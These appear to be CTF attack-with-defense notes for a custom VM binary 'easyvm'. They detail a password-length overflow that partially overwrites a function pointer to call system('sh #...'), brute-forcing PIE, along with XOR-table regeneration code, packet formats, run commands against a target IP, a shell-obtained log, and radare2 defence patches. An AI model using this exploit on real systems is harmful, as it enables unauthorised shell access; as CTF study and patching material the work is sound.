# EasyVM Exploit Development Notes

## Overview

**Binary**: `easyvm` - Custom VM interpreter with vulnerabilities  
**Challenge Type**: PWN (Attack-With-Defense)  
**Target**: TCP port 9999  
**Status**: ✅ **EXPLOIT WORKING**

---

## TL;DR - How to Exploit

```bash
# Local test
python3 exploit_corrected.py

# Remote (default target: 172.24.83.24:9999)
python3 exploit_remote.py

# Remote with custom target
python3 exploit_remote.py <host> <port>
```

**Success Rate**: ~1/16 per connection (PIE brute force)  
**Shell Obtained**: ~8 attempts on average

---

## Vulnerability Summary

### Primary Exploit: Password Buffer Overflow (WORKING)

**Location**: Login handler `fcn.00001d00` @ 0x1e4d

**Root Cause**: 
1. Password buffer at ctx+0x188 is 384 bytes
2. Function pointer at ctx+0x308 (exactly 384 bytes after password)
3. Length check uses `payload_len` from packet header, but copy uses `strchr(';')` distance
4. By setting fake `payload_len` small to pass check, we can copy a longer password

**Exploit Steps**:
1. Capture seed from "Begin connect: %d\n"
2. Generate XOR table using libc srand/rand
3. Send login with 386-byte password:
   - First 4 bytes: `"sh #"` (shell command + comment)
   - Bytes 4-384: padding
   - Bytes 384-386: partial overwrite of func_ptr (0xa0,0x?8 → 0x60,0x?0)
4. Send execute packet - calls `system("sh #AAAA...")`
5. Get shell!

**Key Addresses**:
- `password_encoder`: 0x18a0 (default func_ptr)
- `system@plt`: 0x1060 (target func_ptr)
- Password buffer: ctx+0x188
- Function pointer: ctx+0x308

---

## XOR Encryption

The binary uses a custom XOR algorithm. Key insight: the seed is leaked!

```python
import ctypes
libc = ctypes.CDLL('libc.so.6')

def init_xor_table(seed):
    libc.srand(ctypes.c_uint(seed))
    xor_table = []
    for i in range(16):
        r = libc.rand()
        xor_table.append([r & 0xff, (r >> 8) & 0xff, (r >> 16) & 0xff, (r >> 24) & 0xff])
    return xor_table

def xor_encrypt(data, xor_table):
    result = bytearray()
    edx = 0
    for byte_pair_idx in range(0, len(data), 2):
        ebp = byte_pair_idx
        row1 = edx & 0xf
        col1 = ebp & 2
        result.append(data[ebp] ^ xor_table[row1][col1])
        ecx = ((ebp & 2) >> 1) ^ 1
        ecx = ecx + edx
        if ebp + 1 < len(data):
            row2 = ecx & 0xf
            col2 = (ebp + 1) & 3
            result.append(data[ebp + 1] ^ xor_table[row2][col2])
        edx = ecx
    return bytes(result)
```

---

## Packet Formats

**Login Packet** (opcode=0):
```
[version:4 BE][opcode=0:4 BE][payload_len:4 BE][username:password;session]
```

**Execute Packet** (opcode=1):
```
[version:4 BE][opcode=1:4 BE][session:8]
```

---

## Other Vulnerabilities

### 1. Backdoor at 0x2776 (opcode 0x666)

```asm
0x2776: cmp esi, 0x666
0x277e: lea rdi, "Warning, you enter the backdoor..."
0x2786: call system("/bin/sh")
```

**Problem**: The text assembler only generates opcodes 0-29, so this cannot be triggered directly through normal VM code submission. May need memory corruption to inject opcode.

### 2. XOR Key Leak

The seed is printed via `"Begin connect: %d\n"`, allowing attacker to regenerate XOR table.

---

## Defense Patches

### Patch 1: Fix Buffer Overflow (MOST IMPORTANT)

Ensure password copy length matches the check length:

```bash
# Use radare2 to patch
r2 -w easyvm
s 0x1e4d
# Change memcpy length source to use the checked value
# Need to ensure rdx (length) is <= 384
q
```

Or simpler: Add check before memcpy:
```c
// Pseudo-patch: Add this check at 0x1e3f
if (password_len > 384) password_len = 384;
```

### Patch 2: Remove XOR Seed Leak

```bash
r2 -w easyvm
s 0x127b
"wa nop" @@=0 1 2 3 4 5 6 7 8 9 10 11 12 13 14
q
```

### Patch 3: Remove Backdoor

```bash
r2 -w easyvm
s 0x2776
wx 81feffffff7f   # cmp esi, 0x7fffffff (never matches)
q
```

---

## Files

| File | Description |
|------|-------------|
| `easyvm` | Target binary |
| `exploit_corrected.py` | Local exploit (working) |
| `exploit_remote.py` | Remote exploit for TCP target |
| `EXPLOIT_NOTES.md` | This documentation |
| `easyvm_analysis.md` | Detailed RE analysis |

---

## Testing Log

### Local Test Results

```
$ python3 exploit_corrected.py
[*] EasyVM Exploit - Buffer Overflow to system()
[*] Overwriting func_ptr: 0x18a0 -> 0x1060
[*] Brute-forcing PIE nibble (1/16 success rate per attempt)

[*] Attempt 1...
[+] GOT SHELL! Attempt 8, byte1=0x70
[*] Interactive shell mode. Type commands, Ctrl+C to exit.
id
uid=1000(wyli) gid=1000(wyli) groups=1000(wyli),968(docker),998(wheel)
whoami
wyli
pwd
/home/wyli/repos/hkcert/wyli/ezvm
```

---

## Technical Details

### Why Partial Overwrite Works

With PIE enabled, the binary is loaded at a random base address like `0x555555555000`.

Original func_ptr value (password_encoder):
- Address: `0x555555555000 + 0x18a0 = 0x5555555568a0`
- In memory (little-endian): `a0 68 55 55 55 55 00 00`

Target func_ptr value (system@plt):
- Address: `0x555555555000 + 0x1060 = 0x555555556060`
- In memory (little-endian): `60 60 55 55 55 55 00 00`

We only overwrite bytes [0:2]:
- Change `a0 68` → `60 ?0` where `?` depends on PIE nibble
- Brute force 16 values: 0x00, 0x10, 0x20, ... 0xf0

### Password as Command

When `system(password_buffer)` is called:
- Password starts with `sh #AAA...`
- Shell interprets `sh` as command
- `#AAA...` is a comment (ignored)
- Result: spawns interactive shell

---

## TODO

- [x] Reverse engineer binary
- [x] Identify vulnerabilities
- [x] Understand XOR encryption
- [x] Create local exploit (exploit_corrected.py)
- [x] Create remote exploit (exploit_remote.py)
- [x] Test and verify shell access
- [ ] Test against live target 172.24.83.24:9999
- [ ] Create binary patches
- [ ] Test patches don't break functionality
